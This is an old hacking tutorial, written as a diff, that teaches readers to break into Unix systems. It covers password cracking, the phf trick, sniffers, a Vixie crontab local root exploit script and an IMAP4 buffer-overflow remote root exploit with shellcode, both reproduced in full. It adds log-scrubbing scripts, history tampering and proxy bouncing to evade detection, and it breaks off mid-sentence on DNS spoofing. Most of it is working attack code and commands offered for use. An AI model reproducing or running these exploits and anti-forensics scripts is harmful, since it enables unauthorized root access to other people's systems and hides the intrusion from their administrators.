@@ -1,0 +1,1371 @@
+==============================Hacking Tutorial=================================
+---------------------------Written by Evil_Plague------------------------------
+===============================================================================
+
+Here we go, with a hacking tutorial .... I know many who probably don't want 
+me to write this, cause it will take alot of the magic away from hacking
+for those who look up to hackers .......
+I will try to explain this as easy as possible, so that even the most
+lame windows user *could* hack something by reading this tutorial.
+
+To REALLY understand this file you got to know the basics of UNIX.
+But I'll try to write it in mostly 'cut and paste' examples with
+explanations.
+
+The main reason I'm writing this is cause I am a firm believer of that, the 
+more people who know how the break security, the more people there will be
+that knows how to make security. 
+
+And another reason is that most hacking tutorials or texts Iv seen contains
+little or no hacking at all, they are just breve UNIX command texts
+made by people that thinks that "file" is spellt "phile" or that "hacker" is
+spellt "hax0r" or some lame crap like that, most likely they can't hack there
+way out of a closet.
+
+So if you feel the unstopeble urge to beeing taken like a lamer or beeing
+laughed at, spell words all wrong on purpose.
+
+I'm not writing this to make even more lamers call themselves hackers,
+I'm making it to show that any lamer can download a pre-made exploit
+and use it ... and how easy it really is to break computer security.
+
+One thing with hacking is that you can NOT go around and call yourself a hacker
+if your a windows user, you will only make an ass out of yourself.
+One can do some simple hacking from windows as to exploit cgi/phf holes,
+or telnet to UNIX systems and work from them.
+But to do REAL hacking you need to have your own Linux or UNIX system
+to have the control you over it you need, and most to really learn it.
+
+In this tutorial I will NOT take up anything about Bo (Back Orifice; made by 
+the Cult of the dead cow) or netbus (originally 'nat bus' made by a Swedish 
+programmer), because nether of them are even remotely hacking.
+They are attempts to be backdoors, and have nothing to do with
+nether hacking or virii (viruses) as some computer ilitterat people think.
+
+===============================================================================
+1 - Older techniques & Local Exploits.
+===============================================================================
+
+There are several ways of hacking, but they all have one in common, to exploit
+a bug or weakness in a system or a program to make it do something your 
+normally not allowed to do, or to gain the info you need from a place
+to do the same.
+
+The oldest most well known way to gain root (superuser) access to by cracking
+the root password in the /etc/passed file
+
+If you already have a shell account on a *nix (any sort of unix/linux) computer
+you can do as follows to gain root access (except in the cases I'll state 
+after this) :
+-------------------------------------------------------------------------------
+
+First get a password bruteforcing program such as john-1.6, you can get that
+at almost any place where they have *nix hacking utiletys.
+
+Just user 'lynx' from the command line as "lynx http://www.metacrawler.com"
+to get to a search engine .... search and download it...
+
+unpack it: tar -zvxf john-1.6.tar.gz     ('tar -zvxf' for all files ending
+with '.tar.gz' or '.tgz'
+
+after that you do like this:
+
+[user@localhost user]$ cd john-1.6/run/
+[user@localhost run]$ cat /etc/passwd | grep root > tmp.pass
+[user@localhost run]$ ./john -wordfile:password.lst tmp.pass
+Loaded 1 password (FreeBSD MD5 [32/32])
+monopoly         (root)
+guesses: 1  time: 0:00:10:02 100%  c/s: 1057  trying: monopoly
+[user@localhost run]$ su root
+Password: <here is where you type 'monopoly' (the password)>
+[root@localhost run]# 
+
+And *boom* you are root .... you might want to get a bigger word dictionary then
+the default 'password.lst' that comes with john, so if you can't crack the 
+password, search for a bigger dictionary file.
+
+Where this method doesn't work is when the computer have a 'shadow' password 
+file, if so you will only be able to see an 'x' where the encrypted password 
+would have been, as this:
+
+/etc/passwd  (when there is no shadow file)
+root:k5cunkPfiKy/Y:0:0:root:/root:/bin/bash
+
+/etc/passwd  (when there is a shadow file)
+root:x:0:0:root:/root:/bin/bash
+
+If you don't have a user account or if the computer have a shadowed passwd
+file, you move on to the next methods.
+
+-------------------------------------------------------------------------------
+
+If you don't have a shell you might want to try to get the password with
+the VERY old phf trick .... this is one of the oldest tricks in the book,
+and it only works on very old systems, (as far as I know only on NSCA 
+web servers, but it might work on some other old web servers too).
+
+To use the phf trick you need any web browser, in this example I'll use lynx.
+
+[user@localhost user]$ lynx http://www.the-host.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+And if that works it will display the password file to you...
+The 'www.the-host.com' part is where you type the IP or hostname of the 
+computer you want to get the password file from.
+
+And if you get it displayed: highlight as many lines as you can and paste
+them into a file, then use John-1.6 or similar to crack the passwords.
+
+then telnet to the computer, using a a non-root account and su to root once
+your in.
+Most systems will not allow you to telnet to them as root, that's why you
+need a user account and then 'su' (Substitute User <or> Super User) to root.
+
+-------------------------------------------------------------------------------
+note: Some thinks that 'su' means "switch user" .... it doesn't.
+      The manual pages tells that it means Substitute User and UNIX admin bible
+      says Super User ...)
+-------------------------------------------------------------------------------
+
+If you are on the same internal network (or LAN with same C class IP) as the
+computer you want to hack you can use a sniffer to sniff passwords and so.
+
+Good sniffers are sniffit, linsniff666 and linsniffer ... there is some
+version of sniffit to Windows but I heard it sucks. 
+
+Get any of them, if they come in a '.c' file you need to compile it.
+And to do that you do this:
+
+[user@localhost user]$ gcc linsniff666.c -o linsniff666
+(or: gcc -o linsniff666 linsniff666.c    ---- really the same thing)
+After that you do this:
+[user@localhost user]$ ./linsniff666 &
+[1] 24271
+eth0: Setting promiscuous mode.
+[user@localhost user]$ 
+
+All that linsniff666 sniffes will be logged to a file called 'tcp.log'
+To view it as it happens you can do this:
+
+[user@localhost user]$ tail -f tcp.log
+============================================================
+Time: Tue Nov 16 01:29:27     Size: 44
+Path: d212-151-231-70.swipnet.se => mail.swipnet.se [110]
+------------------------------------------------------------
+USER asd655a4
+PASS 1ds8976as
+STAT
+QUIT
+
+============================================================
+Time: Tue Nov 16 01:29:07     Size: 32
+Path: d212-151-231-73.swipnet.se => ftp.sunet.se [21]
+------------------------------------------------------------
+
+============================================================
+Time: Tue Nov 16 01:29:07     Size: 32
+Path: d212-151-231-73.swipnet.se => ftp.sunet.se [21]
+------------------------------------------------------------
+
+Then 'Ctrl+C' to get out from the listing.
+
+To shut linsniff666 off you do this:
+
+[user@localhost user]$ killall -15 linsniff666
+
+As simple as that.
+
+And yes this log is fabricated, so the passwords are fake =)
+
+Always read the manuals if there are any.
+
+-------------------------------------------------------------------------------
+
+But more about remote hacking later, for now let's stick to local exploits.
+
+-------------------------------------------------------------------------------
+
+Here is a VERY old example of an exploit that doesn't work on any newer system
+as far as I know.
+
+[user@localhost user]$ ln /etc/passwd /var/spool/mail/dead.letter 
+[user@localhost user]$ echo "abc::0:0:root:/root:/bin/bash" | mail a@bogus.a
+[user@localhost user]$ su - abc
+Password:              <<===== here just press enter.
+[abc@localhost root]# 
+
+Here we have hard linked "dead.letter", (the place where mails go if the
+destination address can't be found) to /etc/passwd, that means that
+all that comes into dead.letter also goes to /etc/passwd and since
+Sendmail operates as root, it have the write rights to /etc/passwd.
+
+Then we mail a password-less root (uid/gid 0) to a mail address that doesn't
+exist.
+
+And after that we 'su' to that root user. 
+
+Now this bug is fixed a long time a go, and those systems that still
+might have it, have there /var directory on a separate HD partition,
+and 'ln' can't hard link files that are on different partitions.
+
+But this still gives you an idea of how an exploit might work.
+
+-------------------------------------------------------------------------------
+
+Now I'll take one more local exploit example, this one still works.
+As far as I know it works on RedHat up to version 6.0 and S.u.S.E.
+on versions up to 6.2, haven't heard anything about other Linux distros
+but it might work on alot of distros that uses crontab 3.0.1.
+
+===============================================================================
+Here follows the exploit source code exactly as I got it from bugtraq.
+===============================================================================
+
+Subject:      Vixie Crontab exploit code
+To: BUGTRAQ@SECURITYFOCUS.COM 
+
+
+ Vixie Crontab exploit code
+
+
+begin vixie-ex
+----------------------------------------------------------------------
+#!/bin/sh
+
+
+
+# Vixie crontab exploit
+#
+# Local user can gain root access.
+#
+# Tested redhat linux : 4.2, 5.0, 5.1, 6.0
+# Tested vixie crontab version : 3.0.1
+#
+# This program is only for demonstrative use only.
+# USE IT AT YOUR OWN RISK!
+#
+# Programmed by Taeho Oh 1999/08/31
+#
+# Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+# PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+# PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+
+
+
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+export PATH
+
+
+
+echo
+echo "Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara"
+echo "PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus"
+echo "PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug"
+echo
+
+
+
+echo make shell
+echo
+cat > /tmp/sh.c << EOF
+#include<unistd.h>
+#include<stdlib.h>
+int main()
+{
+        setuid(0);
+        setgid(0);
+        execl("/bin/sh","sh",0);
+        return 0;
+}
+EOF
+echo compile shell
+echo
+cc -o /tmp/sh /tmp/sh.c || gcc -o /tmp/sh /tmp/sh.c
+
+
+
+echo make execute shell script
+echo
+cat > /tmp/makesh << EOF
+#!/bin/sh
+chown root /tmp/sh
+chgrp root /tmp/sh
+chmod 4755 /tmp/sh
+EOF
+chmod 755 /tmp/makesh
+
+
+
+echo hack sendmail.cf
+echo
+cp -f /etc/sendmail.cf /tmp/sendmail.cf.tmp1
+sed 's/O DefaultUser=8:12/O DefaultUser=0:0/g' /tmp/sendmail.cf.tmp1 > /tmp/sendmail.cf
+sed 's/P=\/usr\/bin\/procmail/P=\/tmp\/makesh/g' /tmp/sendmail.cf.tmp1 > /tmp/sendmail.cf.tmp2
+sed 's/A=procmail/A=makesh/g' /tmp/sendmail.cf.tmp2 > /tmp/sendmail.cf.tmp3
+cp /tmp/sendmail.cf.tmp3 /tmp/sendmail.cf
+rm -f /tmp/sendmail.cf.tmp1
+rm -f /tmp/sendmail.cf.tmp2
+rm -f /tmp/sendmail.cf.tmp3
+
+
+
+echo make cron file
+echo
+cat > /tmp/cronfile << EOF
+MAILTO=-C/tmp/sendmail.cf `whoami`
+* * * * * ls
+EOF
+echo input cron file
+echo
+crontab /tmp/cronfile
+
+
+
+echo wait for 1 minute
+echo
+sec=`date +%S`
+wait=`expr 65 - $sec`
+sleep $wait
+
+
+
+echo execute shell
+echo
+/tmp/sh
+
+
+
+echo delete data files
+echo
+cd /tmp
+rm -f sendmail.cf cronfile makesh sh.c
+crontab /dev/null
+----------------------------------------------------------------------
+end vixie-ex
+
+
+--
+
+
+Taeho Oh ( ohhara@postech.edu )                   http://postech.edu/~ohhara
+PLUS ( Postech Laboratory for Unix Security )        http://postech.edu/plus
+PosLUG ( Postech Linux User Group )          http://postech.edu/group/poslug
+
+===============================================================================
+Note: I think this code is made bigger then it have to be on purpose.
+      It can be done about half as big.
+===============================================================================
+
+To make this work: 
+Cut away what comes before "#!/bin/sh" and after "crontab /dev/null", name 
+it something like crontab_exploit.sh and do "chmod a+x crontab_exploit.sh".
+
+then ./crontab_exploit.sh ...... as this following example:
+
+-------------------------------------------------------------------------------
+
+[user@localhost user]$ ./crontab_exploit.sh
+make shell
+
+compile shell
+
+/usr/bin/ld: cannot open output file /tmp/sh: Permission denied
+collect2: ld returned 1 exit status
+/usr/bin/ld: cannot open output file /tmp/sh: Permission denied
+collect2: ld returned 1 exit status
+
+make execute shell script
+
+hack sendmail.cf
+
+make cron file
+
+input cron file
+
+wait for 1 minute
+
+execute shell
+
+bash# whoami
+root
+bash# exit
+delete data files
+[user@localhost user]$ 
+
+-------------------------------------------------------------------------------
+
+make shell <<== makes a .c file that will setuid & setgid 0.
+
+compile shell <<== does what it says, here it compiles the .c file.
+
+make execute shell script <<== makes a script that changes owner & group of 
+                               the compiled .c file to root and suides it.
+
+hack sendmail.cf <<== here it changes the "DefaultUser" in a copy of sendmail's
+                      config file to root, and changes /usr/bin/procmail to
+                      the script I just mentioned.
+
+make cron file <<== here it makes a file that will mail some crontab stuff
+                    using the new sendmail.cf copy.
+
+input cron file <<== executing the sendmail.cf copy.
+
+wait for 1 minute <<== does exactly that, and then executes the newly made
+                       root shell.
+
+The "bash#" is the root 'sh' prompt.
+
+A 'whoami' to check if we really are 'root', and exit to go back to
+normal user mode again, and note that when we exit to user again, it
+deletes the temporary exploit files.
+
+-------------------------------------------------------------------------------
+
+Most of the older techniques still to applies to this day, because of the way
+an operating system is built.
+But enough of that for for now, let's move on to remote exploits and such.
+
+===============================================================================
+2 - Techniques & Remote Exploits.
+===============================================================================
+
+Remote exploits works in a way so you execute a program on your computer,
+that program sends something to the other computer, exploiting a vunerebilety
+and giving you access to the remote operating system.
+
+The phf trick which I talked about in the beginning, uses a bug in the
+remote system to gain information that you normally wouldent be allowed to get.
+
+An exploit doesn't have to give you access to computer thought, 
+a DoS (Denial of Service) attack is also a form of exploit, the most simple
+way of performing a DoS attack is to send oversized fragmented ICMP pings
+that causes windows (95) to crash.
+The most well known DoS attack programs that uses that are 'teardrop', 
+'nestea' and 'nestea2'.
+What happens is, when the Windows computer gets the oversized fragmented ping
+it doesn't know really what to do with it, so it takes alot of CPU time
+to process it, and if you send several of those in a `flood` the system
+totally locks up.
+This is atleast what I have heard is happening, but don't take that as any 
+absolute fact, I have not read the source code for any of those DoS attacks,
+so and I have not really read about flooding all that much...
+Flooding as flooding is just to send so many pings that the remote modem
+can't handle it and shuts down, or atleast gets lagged, anyway flooding
+is lame and you will end up in the remote computers logs if they log...
+And since DoS attacks and Flooding is illegal, that is not a good idea.
+
+-------------------------------------------------------------------------------
+Note: lag / lagging, is another word for long/bad ping times. The time it takes
+      from when you send a request to a remote computer until it responds and
+      it get back to your computer.
+-------------------------------------------------------------------------------
+
+Now let's take a look at a real remote exploit and about what it does,
+this exploit works for imap versions:
+
+IMAP4rev1 9.0
+IMAP4rev1 v10.190
+IMAP4rev1 v10.223
+IMAP4rev1 v10.203
+IMAP4 Service 8.3
+
+So here we go:
+
+===============================================================================
+Here follows the exploit source code exactly as I got it from bugtraq.
+===============================================================================
+
+/* Ultimate IMAP4 sploit coded by The Tekneeq Crew */
+/*	http://www.attrition.org/hosted/tekneeq	   */   
+
+#include <stdio.h>
+#include <stdarg.h>
+#include <unistd.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define RET_POS 1028
+
+int connect_tcp(struct in_addr addr,unsigned short port);
+int fdprintf(int dafd,char *fmt,...);
+void RunShell(int thesock);
+
+struct types {
+  char *name;
+  unsigned long ret_addr;
+};
+
+struct types types[]={
+			{"IMAP4rev1 9.0",0xbffff6e4}, 
+			{"IMAP4rev1 v10.190",0xbffff30f},
+			{"IMAP4rev1 v10.223",0xbffff6e4},
+			{"IMAP4rev1 v10.203",0xbffff30f},
+			{"IMAP4 Service 8.3",0xbffff724}, 
+			{NULL,0}
+                     };
+                     
+char overflow_buff[4096];
+struct in_addr victim;
+
+/* standard shellcode with a few modifications */
+char hellcode[]=
+        "\xeb\x35\x5e\x80\x46\x01\x30\x80\x46\x02\x30\x80\x46\x03\x30"
+        "\x80\x46\x05\x30\x80\x46\x06\x30\x89\xf0\x89\x46\x08\x31\xc0"
+        "\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56"
+        "\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xc6\xff\xff\xff"
+        "\x2f\x32\x39\x3e\x2f\x43\x38"; 
+	                                        
+int main (int argc,char **argv)
+{
+unsigned long *ret;
+char recvbuf[1024];
+int sockfd;
+int i,n=0;
+
+if (argc < 2)
+{
+  printf("Usage: %s <hostname> [offset]\n",argv[0]);
+  exit(0);
+}
+
+if (!host_to_ip(argv[1],&victim))
+{
+  fprintf(stderr,"Hostname lookup failure\n");
+  exit(0);
+}
+
+memset(overflow_buff,0x90,4096);
+for (i=RET_POS-(strlen(hellcode));i<RET_POS;i++)
+  overflow_buff[i]=hellcode[n++];
+
+if ((sockfd=connect_tcp(victim,143)) < 0)
+{
+  fprintf(stderr,"Error connecting to remote host\n");
+  exit(0);
+}
+n=read(sockfd,recvbuf,1024);
+if (n <= 0) {
+  fprintf(stderr,"Connection closed\n");
+  exit(0);
+}
+printf("%s\n",recvbuf);
+for (i=0;;i++)
+{
+  if (types[i].name==NULL)
+  {
+    i=0;
+    break;
+  }
+  if (strstr(recvbuf,types[i].name))
+    break;
+}
+printf("Imap type %d\n",i);
+ret=(unsigned long *)(overflow_buff+RET_POS);
+*ret=types[i].ret_addr;
+if (argv[2]) *ret+=(unsigned long)atoi(argv[2]);
+overflow_buff[RET_POS+4]=0;
+printf("Sending overflow\n");
+fdprintf(sockfd,"* AUTHENTICATE {%d}\n",strlen(overflow_buff));
+fdprintf(sockfd,"%s\r\n",overflow_buff);
+read(sockfd,recvbuf,1024);
+printf("Got shell\n");
+RunShell(sockfd);
+close(sockfd);
+return;
+}
+
+
+void RunShell(int thesock)
+{
+int n;
+char recvbuf[1024];
+fd_set rset;
+
+while (1)
+{
+  FD_ZERO(&rset);
+  FD_SET(thesock,&rset);
+  FD_SET(STDIN_FILENO,&rset);
+  select(thesock+1,&rset,NULL,NULL,NULL);
+  if (FD_ISSET(thesock,&rset))
+  {
+    n=read(thesock,recvbuf,1024);
+    if (n <= 0)
+    {
+      printf("Connection closed\n");
+      exit(0);
+    }
+    recvbuf[n]=0;
+    printf("%s",recvbuf);      
+  }
+  if (FD_ISSET(STDIN_FILENO,&rset))
+  {
+    n=read(STDIN_FILENO,recvbuf,1024);
+    if (n>0)
+    {
+      recvbuf[n]=0;
+      write(thesock,recvbuf,n);
+    }
+  }
+}
+}
+
+int fdprintf(int dafd,char *fmt,...)
+{
+char mybuffer[4096];
+va_list va;
+
+va_start(va,fmt);
+vsnprintf(mybuffer,4096,fmt,va);
+write(dafd,mybuffer,strlen(mybuffer));
+va_end(va);
+return(1);
+}
+
+
+int connect_tcp(struct in_addr addr,unsigned short port)
+{
+struct sockaddr_in serv;
+int thesock,flags;
+
+thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+bzero(&serv,sizeof(serv));
+memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
+serv.sin_port=htons(port);
+serv.sin_family=AF_INET;
+if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
+  return(-1);
+else
+  return(thesock);
+}
+
+int host_to_ip(char *hostname,struct in_addr *addr)
+{
+struct hostent *res;
+
+res=gethostbyname(hostname);
+if (res==NULL)
+  return(0);
+memcpy((char *)addr,res->h_addr,res->h_length);
+return(1);
+}
+
+===============================================================================
+Note: since this is not a socks coding tutorial I wont really go into what 
+      every line in this exploit does, but I will cover it in whole.
+===============================================================================
+
+To make this work:
+Cut away what comes before "#include <stdio.h>" and after the last "}", 
+name is something like "imapx.c" then compile it, like this:
+
+gcc -o imapx imapx.c
+
+then ./imapx <hostname> ...... as this following example:
+
+-------------------------------------------------------------------------------
+
+[user@localhost user]$ gcc -o imapx imapx.c
+[user@localhost user]$ ./imapx 127.0.0.1
+* OK
+localhost.localdomain IMAP4rev1 Service 9.0(157) at Thu, 6 Jan 2000 07:33:39 +0900 (JST) (Report problems in this server to MRC@CAC.Washington.EDU)
+
+Imap type 0
+Sending overflow
+Got shell
+whoami
+root
+exit
+
+Connection closed by foreign host.
+[user@localhost user]$ 
+
+-------------------------------------------------------------------------------
+
+[user@localhost user]$ gcc -o imapx imapx.c	<<== Compiling the exploit.
+[user@localhost user]$ ./imapx 127.0.0.1	<<== Executing it on myself.
+*OK	<<== Connected to host.
+
+localhost.localdomain IMAP4rev1 Service 9.0(157) at Thu, 6 Jan 2000 07:33:39 +0900 (JST) [and more]	<<== Server name, imap version, date, and so on.
+
+Imap type 0	<<== This is the exploits internal type of the imap version.
+Sending overflow	<<== Does what it says, sending the actual exploit.
+Got shell	<<== means it's ready, you are in the remote computer.
+whoami	<<== User input (this is the first command I send)
+root	<<== Answer from the computer, I am in as root.
+exit	<<== I exit the shell, and out of the remote computer.
+
+Connection closed by foreign host.	<<== Is what is says it is.
+[user@localhost user]$	<<== Back in my own computer.
+
+-------------------------------------------------------------------------------
+
+Now you have the basic idea of how to use an exploit, now we come to the
+question, when do you use what sort of exploit ?
+Well to know what remote exploit to use you need to know what servers (daemons)
+the remote computer is running, first step to knowing that is to 'port scan'
+the computer, for that you can use a port scanner such as `nmap`, you can
+get nmap at: http://www.insecure.org/nmap/dist/nmap-2.12.tgz
+or if you prefer rpm's: http://www.insecure.org/nmap/dist/nmap-2.12-1.i386.rpm
+(nmap-2.12 is the latest stable version when I write this in January 2000,
+though there is a nmap-2.3BETA9.)
+
+If you get the *.tgz version you need to unpack it and compile is, and that 
+you do like this:
+
+[user@localhost user]$ tar -zvxf nmap-2.12.tgz
+.......
+here it shows alot of uncompressed files.
+.......
+[user@localhost user]$ cd nmap
+[user@localhost nmap]$ ./configure
+.......
+here it configures the the make scripts, wait until it's done.
+.......
+[user@localhost nmap]$ make
+.......
+here it compiles the program, might take a while.
+.......
+[user@localhost nmap]$ su -c "make install"
+Password:	<<==== here you type the root password.
+
+If you don't have root access to the computer, you can take the 'binary'
+move it to where ever you want and run from there, instead of doing 
+the `su -c "make install"` part.
+Like this:
+[user@localhost nmap]$ cp nmap ../
+[user@localhost nmap]$ cd ..
+[user@localhost user]$ ./nmap 127.0.0.1
+
+Starting nmap V. 2.3BETA9 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+Interesting ports on localhost (127.0.0.1):
+Port    State       Protocol  Service
+21      open        tcp       ftp
+23      open        tcp       telnet
+25      open        tcp       smtp
+143	open	    tcp	      imap2
+113     open        tcp       auth
+515     open        tcp       printer
+6000    open        tcp       X11
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 1 second
+[user@localhost user]$ 
+
+Here you have a computer with 7 ports open, say now that you want to know what 
+version of Sendmail this person is running, you do like this:
+(Sendmail is the 'smtp' on port 25)
+
+[user@localhost user]$ telnet 127.0.0.1 25
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+220 localhost.localdomain ESMTP Sendmail 8.9.3/8.9.3; Sun, 9 Jan 2000 03:03:22 +0100
+quit
+221 localhost.localdomain closing connection
+Connection closed by foreign host.
+[user@localhost user]$ 
+
+Here we telnet to the host (in this case our own computer) and it answered
+with a Sendmail 8.9.3, then we typed `quit` to get out and back to the
+prompt.
+
+Now if we can find a remote *root* exploit for Sendmail 8.9.3, we can
+root it remotely, or if we find a local exploit for it, we root the
+computer if we have user access to it. 
+
+If you got the *.rpm file instead of the *.tgz you install it like this:
+
+[root@localhost user]# rpm -ivh nmap-2.12-1.i386.rpm 
+nmap:		###############################################################
+[root@localhost user]# 
+
+Observe that you have to be root to install an rpm file.
+Those ###'s works like a percent meter, when it's full the file is installed.
+
+The use of it works the same, except if you did the `su -c "make install"`
+or the rpm install you don't have to start it by "./nmap <IP>", just
+typing "nmap <IP>" at a command prompt will do.
+
+-------------------------------------------------------------------------------
+
+By now you know the basic ideas of how to break into a computer, but if
+you were to just apply this in blind you will get busted within a VERY
+short time.
+
+Here is a good time to remember that it is illegal to break into someone's
+computer, and how easy it is to get busted if you try.
+Let me show just how easy it is to get busted by explaining how a hacker
+hides.
+To 'hide' so you wont get noticed, when you hack the old 127.0.0.1 
+(localhost, this is always your own internal IP, if you connect to 
+127.0.0.1 or localhost, you will end up in your own computer), you need
+to know about the following:
+
+Log cleaning, bouncing and spoofing.
+
+Every time you connect to another computer even for just a second, it will
+get logged, that goes for any sort of connection, as if you connect to
+a web page, your IP will be logged, if you telnet to a computer it will
+get logged, and so on.
+
+-------------------------------------------------------------------------------
+
+First thing is you need to learn is how to clean the logs.
+
+The very first thing I can say about logs and log cleaning, is, logs are
+usually stored in a directory called /var/log/ 
+If someone tells you to do "rm -rf /var/log/" as in removing the whole
+directory, just laugh and know that it's a lamer your talking to.
+A system administrator that doesn't notice that the whole /var/log/ is missing
+shouldent be a system administrator.
+And if it is a good system administrator, he may be able to recover all
+the logs and see your IP, and hence getting you busted.
+For those of you that thinks that `undeleting` removed files in Linux or
+UNIX is impossible, read: /usr/doc/HOWTO/mini/Ext2fs-Undeletion 
+
+So do NOT delete ANY files, one way to go about it, (saying that the IP we are 
+going to wipe out of the logs are 127.0.0.1), would be to do this:
+
+[root@localhost root]# cd /var/log/
+[root@localhost log]# ls -la
+total 311
+drwxr-xr-x    2 root     root         1024 Jan  9 04:02 ./
+drwxr-xr-x   17 root     root         1024 Jan  8 01:03 ../
+-rw-------    1 root     root          167 Jan  9 04:22 cron
+-rw-------    1 root     root        63599 Jan  9 04:02 cron.1
+-rw-r--r--    1 root     root         2406 Jan  3 18:42 dmesg
+-rw-r--r--    1 root     root            0 Dec 28 22:50 htmlaccess.log
+-rw-r-----    1 root     root            0 Jan  6 00:04 imapd.log
+-rw-r--r--    1 root     root       146584 Jan  6 04:01 lastlog
+-rw-------    1 root     root          313 Jan  9 04:23 maillog
+-rw-------    1 root     root        12585 Jan  9 03:03 maillog.1
+-rw-------    1 root     root          276 Jan  9 04:22 messages
+-rw-------    1 root     root       185004 Jan  9 04:02 messages.1
+-rw-r--r--    1 root     root            0 Jan  1 04:02 netconf.log
+-rw-------    1 root     root            0 Jan  9 04:02 secure
+-rw-------    1 root     root         8530 Jan  9 02:59 secure.1
+-rw-r--r--    1 root     root          616 Jan  9 04:23 sendmail.st
+-rw-------    1 root     root            0 Jan  9 04:02 spooler
+-rw-------    1 root     root            0 Jan  2 04:02 spooler.1
+-rw-rw-r--    1 root     utmp        28032 Jan  6 04:01 wtmp
+[root@localhost log]#
+
+And from there by hand do something like this for each file:
+
+[root@localhost log]# cat cron | grep -v 127.0.0.1 > file.tmp
+[root@localhost log]# mv file.tmp cron
+[root@localhost log]# cat cron.1 | grep -v 127.0.0.1 > file.tmp
+[root@localhost log]# mv file.tmp cron.1
+
+And so on for each and every file.
+A note beeing that you can make a short script for it, like this:
+
+[root@localhost root]# cd 
+[root@localhost root]# pico clean.sh
+
+Here you get up a new blank file, where in you put the following:
+
+
+#!/bin/bash
+IP="$1"
+cd /var/log/
+ls -1 > list.tmp
+for files in `cat list.tmp`; do
+cat $file | grep -v $IP > tmp.$$
+mv tmp.$$ $file
+done
+rm -f list.tmp
+cd 
+echo "Done"
+rm -f $0
+
+
+Then you press Ctrl+X and save/exit the file, whereon you do this:
+
+[root@localhost root]# chmod a+x clean.sh
+
+That is to make the file executable, then to run it you do like this:
+
+[root@localhost root]# ./clean.sh 127.0.0.1
+Done
+[root@localhost root]# 
+
+That will take away all lines in the logs, that contain the IP 127.0.0.1.
+Also the cleaning script will delete it self when it's don't cleaning 
+the logs, just so you wont forget to remove it after your done.
+The line that makes the script remove it self is the last line:
+"rm -f $0", so if you don't want it to remove it self, remove that line.
+
+But this is still not a good way to do it, if the system administrator
+runs a `tripwire` it will instantly show that the logs have been 
+messed with, and what the changes are, the same thing goes for if someone
+removes the entire directory as well.
+
+Most `tripwires` are set to just check so the logs don't shrink, and
+needless to say, if we remove the IP's from the log it will be smaller
+then with the IP in it.
+
+So what we want to do is to replace our IP with some bogus IP, this
+we can also do with a simple script.
+
+Do the same way as was shown with the last script, but replace the contents
+of the script with this:
+
+
+#!/bin/bash
+IP="$1"
+IP2="$2"
+cd /var/log/
+ls -1 > list.tmp
+for files in `cat list.tmp`; do
+sed 's/'$IP'/'$IP2'/g' $files > tmp.$$
+mv tmp.$$ $files
+done
+rm -f list.tmp
+cd
+echo "Done"
+rm -f $0
+
+To execute this you do:
+
+[root@localhost root]# ./clean.sh 127.0.0.1 145.1.1.4
+Done
+[root@localhost root]#
+
+This will replace the IP (127.0.0.1) with another IP (145.1.1.4), and do make
+sure that if your IP is built like 127.0.0.1 (xxx.x.x.x) you replace it
+with an IP that's built the same way as x.x.x.x takes up less space in a 
+file then the IP xxx.xxx.xxx.xxx would, because x.x.x.x holds less
+characters, and hence a normal (sloppy configured) tripwire would detect it.
+
+After cleaning your IP out of the logs, do the same for your hostname,
+if your IP resolves to a host, as 127.0.0.1 would resolve to "localhost"
+
+A note is that you must already have rooted the box/be root before you can 
+clean up the logs.
+So if you try to hack something and fail, your IP will stay in those logs.
+
+After you cleaned those logs, your actions will still be recorded in a file
+called ~/.bash_history, and on a normal system nothing is written to that
+file until you logs out. so you might want to log out, then log back in
+and clean that by hand with emacs or pico or your text editor of choice.
+
+But then again, if you reconnect to the system, your IP will once again
+be in all logs.
+You *can* link .bash_history to /dev/null by doing:
+
+[user@localhost user]$ rm -f ~/.bash_history
+[user@localhost user]$ ln -s /dev/null ~/.bash_history
+
+But then again, you shouldent remove any files, and a link such as that
+will be noticed the next time the user/admin logs in.
+
+This brings us to bouncing.
+
+-------------------------------------------------------------------------------
+
+Bouncing is when you use a middle computer between your computer and your
+target computer, such as a wingate or an already hacked computer, prefferebley
+both.
+That way YOUR ip will not turn up in the logs.
+It is however still of the utmost importance that you clean those logs, to
+prevent any tracebacks to you.
+
+A wingate is a proxy that usually let's you use it to forward a connection
+to anywhere you want without a password, it's very simple and works like this:
+
+[user@localhost user]$ telnet 212.151.231.70
+Trying 212.151.231.70...
+Connected to d212-151-231-70.swipnet.se.
+Escape character is '^]'.
+WinGate>	<<== Here you just type the IP/host of the computer 
+		     you want to connect to.
+
+like this example:
+
+[user@localhost user]$ telnet 212.151.231.70
+Trying 212.151.231.70...
+Connected to d212-151-231-70.swipnet.se.
+Escape character is '^]'.
+WinGate> 212.151.91.4
+Connecting to host d212-151-91-4.swipnet.se...Connected
+
+login:
+
+And there is where you type the login name and so on, if you have it.
+
+This might come very handy if you know some logins/passwords so you can
+bounce to one computer and do the actual hacking from that.
+
+And again, when you connect to a WinGate, you are most likely to get
+logged there as well .... you may bounce of 10 wingates before you connect
+to a real system.
+It is still possible however unlikely that someone will trace you.
+
+Again a good time to remember that hacking is illegal and how easy it
+is to get busted.
+
+And this brings us to spoofing.
+
+-------------------------------------------------------------------------------
+
+To spoof for read as in DNS spoofing, you need to have root access to a
+name server, (prefferebley an internic registered name server).
+And from there you can cache a fake domain.
+
+The easiest way to do so is to run a program such as jizz, you can get jizz
+from nova5000.com
+The easiest way to get it is to do as this expel:
+
